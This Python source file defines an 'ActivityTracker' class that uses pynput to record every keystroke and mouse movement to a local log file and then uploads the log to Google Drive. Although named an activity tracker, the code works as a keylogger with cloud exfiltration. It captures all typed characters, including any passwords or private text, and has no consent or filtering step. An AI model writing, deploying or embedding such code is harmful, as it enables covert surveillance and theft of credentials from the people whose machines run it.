from pynput import keyboard, mouse
from gdrive_uploader import GoogleDriveUploader  # Import GoogleDriveUploader

class ActivityTracker:
    def __init__(self, gdrive_uploader):
        self.keyboard_listener = None
        self.mouse_listener = None
        self.key_events = []
        self.mouse_events = []
        self.log_file = "activity_log.txt"  # File to save logs
        self.gdrive_uploader = gdrive_uploader  # Google Drive Uploader instance

    def on_keyboard_event(self, key):
        try:
            self.key_events.append(f"Key pressed: {key.char}\n")
        except AttributeError:
            self.key_events.append(f"Special key pressed: {key}\n")
        self.write_to_log()

    def on_mouse_event(self, x, y):
        self.mouse_events.append(f"Mouse moved to: ({x}, {y})\n")
        self.write_to_log()

    def write_to_log(self):
        # Write events to a log file
        with open(self.log_file, "w") as file:
            file.writelines(self.key_events + self.mouse_events)

    def upload_log_to_drive(self):
        # Upload the log file to Google Drive
        print("Uploading activity log to Google Drive...")
        file_id = self.gdrive_uploader.upload_file(self.log_file, folder_id=None)
        print(f"Activity log uploaded to Google Drive with File ID: {file_id}")

    def start_tracking(self):
        with keyboard.Listener(on_press=self.on_keyboard_event) as kb_listener, \
             mouse.Listener(on_move=self.on_mouse_event) as ms_listener:
            self.keyboard_listener = kb_listener
            self.mouse_listener = ms_listener
            print("Tracking activity...")
            try:
                kb_listener.join()
                ms_listener.join()
            except KeyboardInterrupt:
                print("Tracking stopped. Uploading logs...")
                self.upload_log_to_drive()
